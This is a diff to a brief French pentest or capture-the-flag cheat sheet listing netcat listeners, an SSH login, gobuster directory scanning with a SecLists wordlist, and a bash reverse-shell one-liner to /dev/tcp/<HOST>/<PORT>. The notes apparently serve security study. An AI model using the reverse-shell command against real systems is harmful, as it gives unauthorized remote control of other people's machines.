@@ -29,7 +29,8 @@ SHIFT+ENTER after the GET line.
 ECOUTER AVEC NETCAT
 nc -vnlp 80
 
-SE CONNECTER EN SSH 
+SE CONNECTER EN SSH - Port 22 
+trouver un nom d'utilisateur + mdp ou clé 
 ssh -p 22 username@ip-address /
 
 
@@ -46,7 +47,7 @@ taper ensuite tous les résultats en rajoutant /"resultat" à la fin de l'url
 
 GOBUSTER pour trouver des url cachées
 
-gobuster dir -u URL:PORT -w WORDLIST_PATH
+gobuster dir -u URL:PORT -w  /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt 
 
 FAIRE UN SHELL 
 bash -c 'bash -pi >& /dev/tcp/<HOST>/<PORT> 0>&1'
@@ -72,3 +73,7 @@ ECOUTER AVEC NETCAT
 nc -lnvp numeroport
 
 RCE 
+
+
+
+
